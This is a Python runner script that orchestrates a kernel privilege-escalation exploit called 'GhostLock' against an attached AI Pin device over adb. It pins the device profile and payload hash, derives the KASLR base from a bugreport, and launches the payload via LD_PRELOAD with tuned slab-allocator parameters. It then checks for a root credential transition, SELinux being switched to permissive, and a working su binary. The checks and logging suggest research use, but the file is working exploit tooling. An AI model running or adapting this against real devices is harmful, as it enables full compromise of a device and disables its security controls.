#!/usr/bin/env python3
"""Fail-closed, production-equivalent GhostLock runner for an attached AI Pin.

The runner requires an unprivileged adb shell, SELinux enforcing, a pinned
profile manifest/payload hash, and a two-symbol KASLR derivation from the
current boot's bugreport.  It never changes adbd privilege or tracefs.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import queue
import re
import shlex
import signal
import subprocess
import sys
import threading
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ghostlock_profile import (  # noqa: E402
    AllocatorGeometry,
    ProfileError,
    TargetProfile,
    load_profiles,
    profile_by_id,
    verify_payload_profile_binding,
)
from ghostlock_bugreport_kaslr import KaslrParseError, KaslrResult, parse_bugreport


DEFAULT_REMOTE_PAYLOAD = "/data/local/tmp/preload.so"
DEFAULT_REMOTE_SU = "/data/local/tmp/su"
DEFAULT_ATTEMPT_MARKER = "/data/local/tmp/.ghostlock-aipin-attempt"
DEFAULT_MIN_BATTERY = 20
ATTEMPT_CLAIMED_SENTINEL = "GHOSTLOCK_ATTEMPT_ALREADY_CLAIMED"
FORBIDDEN_ADB_SUBCOMMANDS = frozenset(("root", "unroot"))
PROFILES_ROOT = ROOT / "profiles"
PHASE_DURATION_NAMES = frozenset(("preflight", "exploit", "verification"))
STATE_SNAPSHOT_PREFIX = "GHOSTLOCK_STATE_V1"
STREAM_TERMINATE_GRACE_SECONDS = 5.0
STREAM_REAP_GRACE_SECONDS = 10.0
STATE_SNAPSHOT_FIELDS = (
    "boot_id_begin",
    "boot_epoch_begin",
    "uptime_begin",
    "uid",
    "context",
    "selinux",
    "fingerprint",
    "kernel",
    "kernel_release",
    "slot",
    "abi",
    "payload_sha256",
    "boot_id_end",
    "boot_epoch_end",
    "uptime_end",
)


class RunnerError(RuntimeError):
    pass


@dataclass(frozen=True)
class DeviceState:
    serial: str
    uid: str
    context: str
    selinux: str
    boot_id: str
    boot_epoch: str
    uptime_seconds: float
    fingerprint: str
    kernel: str
    kernel_release: str
    slot: str
    abi: str
    payload_sha256: str


class PhaseTimer:
    """Record fixed, privacy-safe phase durations from a monotonic clock."""

    def __init__(self, clock=time.monotonic) -> None:
        self._clock = clock
        self._started = clock()
        self._phase: str | None = None
        self._phase_started: float | None = None
        self._durations: dict[str, float] = {}

    def start(self, phase: str) -> None:
        if phase not in PHASE_DURATION_NAMES:
            raise RunnerError(f"unknown timing phase {phase!r}")
        if self._phase is not None:
            raise RunnerError(f"timing phase {self._phase!r} is already active")
        self._phase = phase
        self._phase_started = self._clock()

    def finish(self) -> None:
        if self._phase is None or self._phase_started is None:
            return
        finished = self._clock()
        self._durations[self._phase] = round(
            max(0.0, finished - self._phase_started), 3
        )
        self._phase = None
        self._phase_started = None

    def snapshot(self) -> dict[str, float]:
        observed = self._clock()
        durations = dict(self._durations)
        if self._phase is not None and self._phase_started is not None:
            durations[self._phase] = round(
                max(0.0, observed - self._phase_started), 3
            )
        durations["total"] = round(max(0.0, observed - self._started), 3)
        return durations


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def assert_payload_profile_binding(
    path: Path,
    profile: TargetProfile,
    expected_payload_sha256: str,
) -> None:
    try:
        verify_payload_profile_binding(
            path, profile, expected_payload_sha256
        )
    except ProfileError as exc:
        raise RunnerError(f"local {exc}") from exc


class Adb:
    def __init__(self, serial: str, executable: str = "adb") -> None:
        self.serial = serial
        self.executable = executable

    def run(
        self,
        *args: str,
        timeout: int = 30,
        check: bool = True,
    ) -> subprocess.CompletedProcess[str]:
        if args and args[0] in FORBIDDEN_ADB_SUBCOMMANDS:
            raise RunnerError(f"forbidden adb subcommand requested: {args[0]}")
        command = [self.executable, "-s", self.serial, *args]
        try:
            result = subprocess.run(
                command,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                check=False,
            )
        except (OSError, subprocess.TimeoutExpired) as exc:
            raise RunnerError(f"command failed: {shlex.join(command)}: {exc}") from exc
        result.stdout = result.stdout.replace("\r", "")
        if check and result.returncode != 0:
            raise RunnerError(
                f"command exited {result.returncode}: {shlex.join(command)}\n"
                f"{result.stdout.strip()}"
            )
        return result

    def shell(self, command: str, *, timeout: int = 30, check: bool = True):
        return self.run("shell", command, timeout=timeout, check=check)


def _state_snapshot_command(remote_payload: str) -> str:
    payload = shlex.quote(remote_payload)
    commands = (
        ("boot_id_begin", "cat /proc/sys/kernel/random/boot_id"),
        ("boot_epoch_begin", "sed -n 's/^btime //p' /proc/stat | head -n 1"),
        ("uptime_begin", "cut -d ' ' -f 1 /proc/uptime"),
        ("uid", "id -u"),
        ("context", "id -Z"),
        ("selinux", "getenforce"),
        ("fingerprint", "getprop ro.build.fingerprint"),
        ("kernel", "uname -a"),
        ("kernel_release", "uname -r"),
        ("slot", "getprop ro.boot.slot_suffix"),
        ("abi", "getprop ro.product.cpu.abi"),
        (
            "payload_sha256",
            f"toybox sha256sum {payload} 2>/dev/null | cut -c 1-64",
        ),
        ("boot_id_end", "cat /proc/sys/kernel/random/boot_id"),
        ("boot_epoch_end", "sed -n 's/^btime //p' /proc/stat | head -n 1"),
        ("uptime_end", "cut -d ' ' -f 1 /proc/uptime"),
    )
    emit = (
        "emit() { printf '"
        + STATE_SNAPSHOT_PREFIX
        + "\\t%s\\t%s\\n' \"$1\" \"$2\"; };"
    )
    samples = [
        f"emit {shlex.quote(tag)} \"$({command})\""
        for tag, command in commands
    ]
    return " ".join((emit, "; ".join(samples)))


def _parse_state_snapshot(text: str) -> dict[str, str]:
    expected = frozenset(STATE_SNAPSHOT_FIELDS)
    values: dict[str, str] = {}
    for line_number, line in enumerate(text.splitlines(), start=1):
        fields = line.split("\t")
        if len(fields) != 3 or fields[0] != STATE_SNAPSHOT_PREFIX:
            raise RunnerError(f"malformed device-state record at line {line_number}")
        tag, value = fields[1:]
        if tag not in expected:
            raise RunnerError(f"unexpected device-state tag {tag!r}")
        if tag in values:
            raise RunnerError(f"duplicate device-state tag {tag!r}")
        if (
            not value
            or value != value.strip()
            or not value.isascii()
            or not value.isprintable()
        ):
            raise RunnerError(f"invalid device-state value for {tag!r}")
        values[tag] = value

    missing = [tag for tag in STATE_SNAPSHOT_FIELDS if tag not in values]
    if missing:
        raise RunnerError("missing device-state tag(s): " + ", ".join(missing))
    return values


def _parse_uptime(value: str, tag: str) -> float:
    if not re.fullmatch(r"[0-9]+(?:\.[0-9]+)?", value):
        raise RunnerError(f"invalid kernel uptime for {tag!r}: {value!r}")
    uptime = float(value)
    if uptime < 0:
        raise RunnerError(f"invalid negative kernel uptime for {tag!r}: {value!r}")
    return uptime


def capture_state(
    adb: Adb,
    remote_payload: str,
    *,
    allow_boot_id_scratch: bool = False,
) -> DeviceState:
    state = adb.run("get-state").stdout.strip()
    if state != "device":
        raise RunnerError(f"adb state is {state!r}, expected 'device'")
    snapshot = _parse_state_snapshot(
        adb.shell(_state_snapshot_command(remote_payload)).stdout
    )
    if (
        not allow_boot_id_scratch
        and snapshot["boot_id_begin"] != snapshot["boot_id_end"]
    ):
        raise RunnerError("kernel boot ID changed during device-state capture")
    if snapshot["boot_epoch_begin"] != snapshot["boot_epoch_end"]:
        raise RunnerError("kernel boot epoch changed during device-state capture")
    if not re.fullmatch(r"[0-9]+", snapshot["boot_epoch_end"]):
        raise RunnerError(
            f"invalid kernel boot epoch {snapshot['boot_epoch_end']!r}"
        )
    uptime_begin = _parse_uptime(snapshot["uptime_begin"], "uptime_begin")
    uptime_end = _parse_uptime(snapshot["uptime_end"], "uptime_end")
    if uptime_end + 2.0 < uptime_begin:
        raise RunnerError(
            "device uptime moved backwards during state capture: "
            f"{uptime_begin:.2f}->{uptime_end:.2f}"
        )
    remote_sha = snapshot["payload_sha256"]
    if not re.fullmatch(r"[0-9a-fA-F]{64}", remote_sha):
        raise RunnerError(f"cannot hash remote payload {remote_payload}")

    return DeviceState(
        serial=adb.serial,
        uid=snapshot["uid"],
        context=snapshot["context"],
        selinux=snapshot["selinux"],
        boot_id=snapshot["boot_id_end"],
        boot_epoch=snapshot["boot_epoch_end"],
        uptime_seconds=uptime_end,
        fingerprint=snapshot["fingerprint"],
        kernel=snapshot["kernel"],
        kernel_release=snapshot["kernel_release"],
        slot=snapshot["slot"],
        abi=snapshot["abi"],
        payload_sha256=remote_sha.lower(),
    )


def assert_production_equivalent(
    state: DeviceState,
    *,
    profile: TargetProfile,
    expected_payload_sha256: str,
    expected_selinux: str = "Enforcing",
) -> None:
    if state.uid != "2000":
        raise RunnerError(
            f"adbd shell must be uid 2000; observed uid {state.uid}. "
            "This run is not production-equivalent."
        )
    if state.context != "u:r:shell:s0":
        raise RunnerError(f"unexpected adb shell context {state.context!r}")
    if state.selinux != expected_selinux:
        raise RunnerError(
            f"SELinux must be {expected_selinux}; observed {state.selinux!r}"
        )
    if state.payload_sha256 != expected_payload_sha256.lower():
        raise RunnerError(
            "remote payload hash mismatch: "
            f"expected {expected_payload_sha256}, observed {state.payload_sha256}"
        )
    mismatches = profile.mismatches(
        fingerprint=state.fingerprint,
        kernel=state.kernel,
        kernel_release=state.kernel_release,
        slot=state.slot,
        abi=state.abi,
    )
    if mismatches:
        raise RunnerError("profile mismatch: " + "; ".join(mismatches))


def assert_same_boot(
    before: DeviceState,
    after: DeviceState,
    *,
    allow_boot_id_scratch: bool = False,
) -> None:
    fields = [
        "serial",
        "boot_epoch",
        "fingerprint",
        "kernel",
        "kernel_release",
        "slot",
        "abi",
        "payload_sha256",
    ]
    if not allow_boot_id_scratch:
        fields.append("boot_id")
    changed = [
        field
        for field in fields
        if getattr(before, field) != getattr(after, field)
    ]
    if changed:
        details = ", ".join(
            f"{field}={getattr(before, field)!r}->{getattr(after, field)!r}"
            for field in changed
        )
        raise RunnerError(f"device identity changed during run: {details}")
    if after.uptime_seconds + 2.0 < before.uptime_seconds:
        raise RunnerError(
            "device uptime moved backwards during run: "
            f"{before.uptime_seconds:.2f}->{after.uptime_seconds:.2f}"
        )


def assert_root_markers(log_text: str, profile: TargetProfile) -> None:
    required = {
        "profile identity": re.escape(
            f"target kernel accepted profile={profile.profile_id} "
            f"manifest_sha256={profile.manifest_sha256} "
            f"image_sha256={profile.kernel_image_sha256} "
            f"symbols_sha256={profile.symbols_sha256}"
        ),
        "same-attempt reclaim capture": (
            r"perf reclaim gate result verified=1 .*free=1 alloc=1"
        ),
        "credential transition": (
            r"direct credential result uid=0 euid=0 gid=0 egid=0 .*"
            r"selinux=1->0"
        ),
        "root summary": (
            r"direct-root-summary root=1 id=1 su=1/"
        ),
    }
    missing = [
        name for name, pattern in required.items()
        if re.search(pattern, log_text) is None
    ]
    if missing:
        raise RunnerError(
            "exploit output lacks required proof marker(s): " + ", ".join(missing)
        )


def ensure_no_preexisting_root(adb: Adb, remote_su: str) -> None:
    result = adb.shell(
        f"{shlex.quote(remote_su)} -c id", timeout=15, check=False
    )
    if result.returncode == 0 and "uid=0(root)" in result.stdout:
        raise RunnerError(
            "pre-existing su access is active; refusing to count this as a clean replay"
        )


def attempt_token(state: DeviceState) -> str:
    # The exploit intentionally repoints the boot_id sysctl data pointer.
    # The kernel boot epoch and immutable fingerprint remain stable.
    return f"{state.boot_epoch} {state.fingerprint}"


def attempt_lock_path(state: DeviceState, marker_path: str) -> str:
    token_digest = hashlib.sha256(attempt_token(state).encode("utf-8")).hexdigest()
    return f"{marker_path}.{token_digest}.lock"


def ensure_no_same_boot_attempt(
    adb: Adb, state: DeviceState, marker_path: str
) -> None:
    lock_path = shlex.quote(attempt_lock_path(state, marker_path))
    marker = shlex.quote(marker_path)
    result = adb.shell(
        f"if [ -d {lock_path} ]; then "
        f"printf '%s\\n' {shlex.quote(ATTEMPT_CLAIMED_SENTINEL)}; "
        f"elif [ -f {marker} ]; then cat {marker}; else :; fi",
        check=False,
    )
    if result.returncode != 0:
        raise RunnerError("cannot inspect the same-boot attempt claim")
    observed = result.stdout.strip()
    if observed in (ATTEMPT_CLAIMED_SENTINEL, attempt_token(state)):
        raise RunnerError(
            "this kernel boot already had an exploit attempt; reboot the Pin before retrying"
        )


def parse_battery(text: str) -> tuple[int | None, bool | None]:
    level_match = re.search(r"(?m)^\s*level:\s*(\d+)\s*$", text)
    level = int(level_match.group(1)) if level_match else None
    if level is not None and not 0 <= level <= 100:
        level = None
    power_matches = re.findall(
        r"(?mi)^\s*(?:AC|USB|Wireless) powered:\s*(true|false)\s*$", text
    )
    powered = (
        any(value.lower() == "true" for value in power_matches)
        if power_matches
        else None
    )
    return level, powered


def require_attempt_power(adb: Adb, min_battery: int) -> None:
    if not 0 <= min_battery <= 100:
        raise RunnerError("minimum battery must be between 0 and 100")
    if min_battery == 0:
        return
    result = adb.shell("dumpsys battery", check=False)
    level, powered = parse_battery(result.stdout if result.returncode == 0 else "")
    if level is None or powered is None:
        raise RunnerError(
            "battery or power state is unavailable immediately before the attempt; "
            "the same-boot attempt marker was not written"
        )
    if level < min_battery:
        raise RunnerError(
            f"battery fell to {level}%; at least {min_battery}% is required "
            "immediately before the attempt; the same-boot attempt marker was not written"
        )
    if not powered:
        raise RunnerError(
            "external power disconnected before the attempt; "
            "the same-boot attempt marker was not written"
        )


def acquire_same_boot_attempt(
    adb: Adb,
    state: DeviceState,
    marker_path: str,
    *,
    min_battery: int,
) -> None:
    require_attempt_power(adb, min_battery)
    token = shlex.quote(attempt_token(state))
    marker = shlex.quote(marker_path)
    lock_path = shlex.quote(attempt_lock_path(state, marker_path))
    result = adb.shell(
        f"umask 077; mkdir {lock_path} || exit 73; "
        f"printf '%s\\n' {token} > {marker}",
        check=False,
    )
    if result.returncode != 0:
        raise RunnerError(
            "could not atomically acquire the same-boot attempt claim; "
            "another runner may own it, so reboot before retrying"
        )


def make_bugreport(adb: Adb, destination: Path, timeout: int) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    result = adb.run("bugreport", str(destination), timeout=timeout, check=False)
    if result.returncode != 0 or not destination.is_file():
        raise RunnerError(
            f"bugreport capture failed with exit {result.returncode}: "
            f"{result.stdout.strip()}"
        )


def build_exploit_argv(
    runtime_text_base: int,
    remote_payload: str,
    *,
    geometry: AllocatorGeometry,
) -> list[str]:
    return [
        "/system/bin/env",
        f"AI_PIN_MM_OBJECT_SIZE={geometry.object_size}",
        f"AI_PIN_MM_SLAB_SIZE={geometry.slab_size}",
        f"AI_PIN_MM_ORDER={geometry.order}",
        f"AI_PIN_MM_OBJS_PER_SLAB={geometry.objects_per_slab}",
        f"AI_PIN_MM_CPU_PARTIAL={geometry.cpu_partial}",
        "AI_PIN_PERF_RECLAIM_GATE=1",
        "AI_PIN_SLIDE_LEAK=2",
        f"AI_PIN_KASLR_BASE=0x{runtime_text_base:016x}",
        f"LD_PRELOAD={remote_payload}",
        "/system/bin/true",
    ]


def _signal_process_group(process: subprocess.Popen[str], sig: int) -> str | None:
    try:
        os.killpg(process.pid, sig)
    except ProcessLookupError:
        return None
    except OSError as exc:
        return f"could not send signal {sig} to process group: {exc}"
    return None


def _process_group_exists(process: subprocess.Popen[str]) -> bool:
    try:
        os.killpg(process.pid, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    return True


def _stop_and_reap_stream_process(
    process: subprocess.Popen[str], reader_thread: threading.Thread | None
) -> str | None:
    errors: list[str] = []
    if _process_group_exists(process):
        signal_error = _signal_process_group(process, signal.SIGTERM)
        if signal_error is not None:
            errors.append(signal_error)

        terminate_deadline = (
            time.monotonic() + STREAM_TERMINATE_GRACE_SECONDS
        )
        while _process_group_exists(process):
            remaining = terminate_deadline - time.monotonic()
            if remaining <= 0:
                break
            interval = min(0.05, remaining)
            if process.poll() is None:
                try:
                    process.wait(timeout=interval)
                except subprocess.TimeoutExpired:
                    pass
            elif reader_thread is not None and reader_thread.is_alive():
                reader_thread.join(timeout=interval)
            else:
                time.sleep(interval)

    if _process_group_exists(process):
        signal_error = _signal_process_group(process, signal.SIGKILL)
        if signal_error is not None:
            errors.append(signal_error)

    try:
        process.wait(timeout=STREAM_REAP_GRACE_SECONDS)
    except subprocess.TimeoutExpired:
        errors.append("process did not exit after SIGKILL")

    if reader_thread is not None:
        reader_thread.join(timeout=STREAM_REAP_GRACE_SECONDS)
        if reader_thread.is_alive():
            errors.append("output reader did not stop after process exit")

    group_deadline = time.monotonic() + STREAM_REAP_GRACE_SECONDS
    while _process_group_exists(process) and time.monotonic() < group_deadline:
        time.sleep(
            min(0.05, max(0.0, group_deadline - time.monotonic()))
        )
    if _process_group_exists(process):
        errors.append("process group did not exit after SIGKILL")

    if reader_thread is None or not reader_thread.is_alive():
        if process.stdout is not None:
            process.stdout.close()

    return "; ".join(errors) or None


def stream_process(command: list[str], log_path: Path, timeout: float) -> int:
    output_queue: queue.Queue[str | None] = queue.Queue()
    reader_errors: list[Exception] = []
    with log_path.open("w", encoding="utf-8") as log:
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except OSError as exc:
            raise RunnerError(f"could not start exploit command: {exc}") from exc

        thread: threading.Thread | None = None

        def reader() -> None:
            assert process.stdout is not None
            try:
                for line in process.stdout:
                    output_queue.put(line.replace("\r", ""))
            except Exception as exc:
                reader_errors.append(exc)
            finally:
                output_queue.put(None)

        def emit(line: str) -> None:
            print(line, end="", flush=True)
            log.write(line)
            log.flush()

        def drain_output() -> None:
            while True:
                try:
                    line = output_queue.get_nowait()
                except queue.Empty:
                    return
                if line is not None:
                    emit(line)

        try:
            reader_thread = threading.Thread(target=reader, daemon=True)
            reader_thread.start()
            thread = reader_thread
            deadline = time.monotonic() + timeout
            stream_closed = False
            while process.poll() is None or not stream_closed:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise RunnerError(
                        f"exploit command exceeded {timeout} seconds"
                    )
                try:
                    line = output_queue.get(timeout=min(1.0, remaining))
                except queue.Empty:
                    continue
                if line is None:
                    stream_closed = True
                else:
                    emit(line)

            thread.join(timeout=STREAM_REAP_GRACE_SECONDS)
            if thread.is_alive():
                raise RunnerError("exploit output reader did not stop")
            drain_output()
            if reader_errors:
                raise RunnerError(
                    f"could not read exploit output: {reader_errors[0]}"
                )
            assert process.returncode is not None
            return process.returncode
        except BaseException as exc:
            cleanup_error = _stop_and_reap_stream_process(process, thread)
            drain_output()
            if cleanup_error is not None:
                if isinstance(exc, RunnerError):
                    raise RunnerError(
                        f"{exc}; cleanup failed: {cleanup_error}"
                    ) from exc
                raise RunnerError(
                    f"exploit command cleanup failed: {cleanup_error}"
                ) from exc
            if isinstance(exc, (KeyboardInterrupt, SystemExit)):
                raise
            if isinstance(exc, RunnerError):
                raise
            raise RunnerError(f"exploit command failed: {exc}") from exc
        finally:
            if thread is not None and not thread.is_alive():
                if process.stdout is not None and not process.stdout.closed:
                    process.stdout.close()


def kaslr_json(result: KaslrResult) -> dict[str, object]:
    return {
        "report_member": result.report_member,
        "link_text_base": f"0x{result.link_text_base:016x}",
        "runtime_text_base": f"0x{result.runtime_text_base:016x}",
        "slide": f"0x{result.slide:x}",
        "anchors": [
            {
                **asdict(anchor),
                "offset": f"0x{anchor.offset:x}",
                "link_address": f"0x{anchor.link_address:016x}",
                "runtime_address": f"0x{anchor.runtime_address:016x}",
                "slide": f"0x{anchor.slide:x}",
            }
            for anchor in result.anchors
        ],
    }


def write_manifest(path: Path, manifest: dict[str, object]) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    temporary.replace(path)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--serial", required=True)
    parser.add_argument("--profile-id", required=True)
    parser.add_argument("--profile-sha256", required=True)
    parser.add_argument("--expected-boot-id")
    parser.add_argument("--bugreport", type=Path)
    parser.add_argument(
        "--retain-bugreport",
        action="store_true",
        help="retain a newly captured raw bugreport (privacy-sensitive)",
    )
    parser.add_argument("--bugreport-timeout", type=int, default=600)
    parser.add_argument("--payload-sha256", required=True)
    parser.add_argument("--remote-payload", default=DEFAULT_REMOTE_PAYLOAD)
    parser.add_argument("--remote-su", default=DEFAULT_REMOTE_SU)
    parser.add_argument("--attempt-marker", default=DEFAULT_ATTEMPT_MARKER)
    parser.add_argument("--min-battery", type=int, default=DEFAULT_MIN_BATTERY)
    parser.add_argument("--timeout", type=int, default=3600)
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args(argv)

    if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_sha256):
        parser.error("--payload-sha256 must be exactly 64 hexadecimal characters")
    if not re.fullmatch(r"[0-9a-f]{64}", args.profile_sha256):
        parser.error("--profile-sha256 must be exactly 64 lowercase hexadecimal characters")
    if args.timeout < 60 or args.bugreport_timeout < 60:
        parser.error("timeouts must be at least 60 seconds")
    if not 0 <= args.min_battery <= 100:
        parser.error("--min-battery must be between 0 and 100")
    try:
        profile = profile_by_id(load_profiles(PROFILES_ROOT), args.profile_id)
    except ProfileError as exc:
        parser.error(str(exc))
    if profile.manifest_sha256 != args.profile_sha256:
        parser.error(
            "profile manifest hash mismatch: "
            f"expected {args.profile_sha256}, observed {profile.manifest_sha256}"
        )
    geometry = profile.allocator_geometry
    local_payload = (
        ROOT / "source" / "build" / profile.project / "bin" / "preload.so"
    )
    try:
        assert_payload_profile_binding(
            local_payload, profile, args.payload_sha256
        )
    except RunnerError as exc:
        parser.error(str(exc))

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    output_dir = args.output_dir or Path(
        f"/private/tmp/ghostlock-prod-equivalent-{timestamp}"
    )
    output_dir.mkdir(parents=True, exist_ok=False)
    output_dir.chmod(0o700)
    manifest_path = output_dir / "manifest.json"
    manifest: dict[str, object] = {
        "started_at": utc_now(),
        "mode": "execute" if args.execute else "preflight-only",
        "serial": args.serial,
        "profile_id": profile.profile_id,
        "profile_manifest": str(profile.manifest_path),
        "profile_sha256": profile.manifest_sha256,
        "kernel_image_sha256": profile.kernel_image_sha256,
        "local_payload": str(local_payload),
        "symbols": str(profile.symbols_path),
        "symbols_sha256": profile.symbols_sha256,
        "mm_geometry": asdict(geometry),
        "output_dir": str(output_dir),
    }
    phase_timer = PhaseTimer()
    phase_timer.start("preflight")

    transient_bugreport: Path | None = None
    try:
        adb = Adb(args.serial)
        initial = capture_state(adb, args.remote_payload)
        assert_production_equivalent(
            initial,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
        )
        if args.expected_boot_id and initial.boot_id != args.expected_boot_id:
            raise RunnerError(
                f"boot ID mismatch: expected {args.expected_boot_id}, "
                f"observed {initial.boot_id}"
            )
        ensure_no_preexisting_root(adb, args.remote_su)
        ensure_no_same_boot_attempt(adb, initial, args.attempt_marker)
        manifest["initial_state"] = asdict(initial)

        bugreport = args.bugreport
        captured_in_this_run = bugreport is None
        if captured_in_this_run:
            bugreport = output_dir / f"bugreport-{args.serial}-{timestamp}.zip"
            if not args.retain_bugreport:
                transient_bugreport = bugreport
            print(f"capturing current-boot bugreport to {bugreport}", flush=True)
            make_bugreport(adb, bugreport, args.bugreport_timeout)
        if not bugreport.is_file():
            raise RunnerError(f"bugreport does not exist: {bugreport}")
        manifest["bugreport"] = str(bugreport.resolve())
        manifest["bugreport_sha256"] = sha256_file(bugreport)
        manifest["bugreport_retained"] = (
            not captured_in_this_run or args.retain_bugreport
        )

        kaslr = parse_bugreport(
            bugreport,
            profile.symbols_path,
            # Retail dumpstate omits linuxBootId.  A bugreport captured by this
            # runner is still boot-bound: capture_state() brackets dumpstate
            # and assert_same_boot() checks boot ID, boot epoch and uptime
            # before --execute can proceed.  Pre-existing bugreports retain the
            # stronger in-report boot-ID requirement.
            expected_boot_id=None if captured_in_this_run else initial.boot_id,
            expected_serial=args.serial,
            expected_fingerprint=profile.fingerprint,
        )
        manifest["bugreport_binding"] = (
            "synchronous-before-after-device-state"
            if captured_in_this_run
            else "embedded-linuxBootId"
        )
        manifest["kaslr"] = kaslr_json(kaslr)
        if transient_bugreport is not None:
            transient_bugreport.unlink()
            transient_bugreport = None
            manifest["bugreport"] = None
            print("discarded raw bugreport after KASLR extraction", flush=True)
        print(
            f"KASLR base 0x{kaslr.runtime_text_base:016x} accepted from "
            f"{len(kaslr.anchors)} agreeing WARN anchors",
            flush=True,
        )

        pinned = capture_state(adb, args.remote_payload)
        assert_production_equivalent(
            pinned,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
        )
        assert_same_boot(initial, pinned)
        manifest["pinned_state"] = asdict(pinned)
        manifest["preflight"] = "green"
        phase_timer.finish()
        manifest["phase_durations_seconds"] = phase_timer.snapshot()
        write_manifest(manifest_path, manifest)
        print(
            "preflight green: adbd uid=2000, shell domain, SELinux enforcing, "
            "identity and payload pinned",
            flush=True,
        )

        if not args.execute:
            manifest["completed_at"] = utc_now()
            manifest["result"] = "preflight-only"
            manifest["phase_durations_seconds"] = phase_timer.snapshot()
            write_manifest(manifest_path, manifest)
            return 0

        phase_timer.start("exploit")
        acquire_same_boot_attempt(
            adb,
            pinned,
            args.attempt_marker,
            min_battery=args.min_battery,
        )
        manifest["attempt_marker"] = args.attempt_marker
        manifest["attempt_token"] = attempt_token(pinned)
        manifest["phase_durations_seconds"] = phase_timer.snapshot()
        write_manifest(manifest_path, manifest)

        exploit_argv = build_exploit_argv(
            kaslr.runtime_text_base,
            args.remote_payload,
            geometry=geometry,
        )
        remote_command = shlex.join(exploit_argv)
        host_command = ["adb", "-s", args.serial, "shell", remote_command]
        manifest["exploit_argv"] = exploit_argv
        write_manifest(manifest_path, manifest)
        print("starting production-equivalent exploit attempt", flush=True)
        exploit_rc = stream_process(
            host_command, output_dir / "run.log", args.timeout
        )
        manifest["exploit_returncode"] = exploit_rc
        phase_timer.finish()
        phase_timer.start("verification")
        manifest["phase_durations_seconds"] = phase_timer.snapshot()

        # The exploit deliberately repoints the boot_id sysctl data pointer.
        # Keep sampling both values, but bind the post-exploit snapshot to the
        # stable kernel boot epoch and uptime instead of the scratch UUID.
        final_state = capture_state(
            adb, args.remote_payload, allow_boot_id_scratch=True
        )
        assert_same_boot(initial, final_state, allow_boot_id_scratch=True)
        manifest["final_state"] = asdict(final_state)
        manifest["boot_id_scratch_observed"] = (
            initial.boot_id != final_state.boot_id
        )
        if exploit_rc != 0:
            raise RunnerError(f"exploit command returned {exploit_rc}")

        assert_production_equivalent(
            final_state,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
            expected_selinux="Permissive",
        )

        run_log_text = (output_dir / "run.log").read_text(
            encoding="utf-8", errors="replace"
        )
        assert_root_markers(run_log_text, profile)

        acceptance = adb.shell(
            f"{shlex.quote(args.remote_su)} -c id", timeout=30, check=False
        )
        (output_dir / "acceptance.txt").write_text(
            acceptance.stdout, encoding="utf-8"
        )
        manifest["acceptance_returncode"] = acceptance.returncode
        manifest["acceptance_output"] = acceptance.stdout.strip()
        if acceptance.returncode != 0 or "uid=0(root)" not in acceptance.stdout:
            raise RunnerError(
                "fresh-shell acceptance failed: " + acceptance.stdout.strip()
            )
        manifest["result"] = "root-via-production-equivalent-chain"
        manifest["completed_at"] = utc_now()
        phase_timer.finish()
        manifest["phase_durations_seconds"] = phase_timer.snapshot()
        write_manifest(manifest_path, manifest)
        print(acceptance.stdout.strip(), flush=True)
        print(f"evidence written to {output_dir}", flush=True)
        return 0
    except (RunnerError, KaslrParseError, OSError) as exc:
        phase_timer.finish()
        manifest["completed_at"] = utc_now()
        manifest["result"] = "failed-closed"
        manifest["error"] = str(exc)
        manifest["phase_durations_seconds"] = phase_timer.snapshot()
        try:
            write_manifest(manifest_path, manifest)
        except OSError:
            pass
        print(f"ERROR: {exc}", file=sys.stderr, flush=True)
        return 2
    finally:
        if transient_bugreport is not None:
            try:
                transient_bugreport.unlink(missing_ok=True)
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
